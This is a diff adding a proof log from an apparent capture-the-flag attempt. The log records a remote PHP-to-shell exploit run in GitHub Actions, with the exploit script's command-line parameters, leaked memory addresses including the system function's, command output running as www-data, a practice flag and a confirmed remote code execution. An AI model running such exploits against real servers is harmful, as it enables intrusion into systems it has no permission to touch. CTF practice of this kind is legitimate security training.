@@ -1,0 +1,15 @@
+REMOTE php2shell proof
+run=https://github.com/Erwann9875/stealmybitcoin-ctf-attempt/actions/runs/40428614981
+commit=b021188198c73b39f7dfee33b56fdc00234e0e65
+created_at=2026-10-27T00:47:26Z
+conclusion=success
+command=python3 remote_proof.py --direct --attempts 4 --timeout 20 --retry-delay 5 --leak-length 0x440 --pre-parameters 8 --b1-fillers 5 --worker-stride 1
+attempt=1 b1_fillers=5 failed: B1 OOM was not observed (HTTP 400, 22 bytes)
+attempt=2 statuses=200/200/200/200/200/200
+main=0x7fd5eee00000 php=0x55ee2e200000 zif_system=0x55ee2e70dd70
+response=uid=82(www-data) gid=82(www-data) groups=82(www-data)
+practice{challenge_already_won}
+RESULT=REMOTE_RCE_CONFIRMED
+proof_log=/home/runner/work/stealmybitcoin-ctf-attempt/stealmybitcoin-ctf-attempt/remote-proof.log
+SHA256 digest of uploaded artifact zip is 1bf5934edd84d5b1b5aee38f684c4d579f13e9bba686018efb2313a0e5149fdf
+Artifact download URL: https://github.com/Erwann9875/stealmybitcoin-ctf-attempt/actions/runs/40428614981/artifacts/12701450173
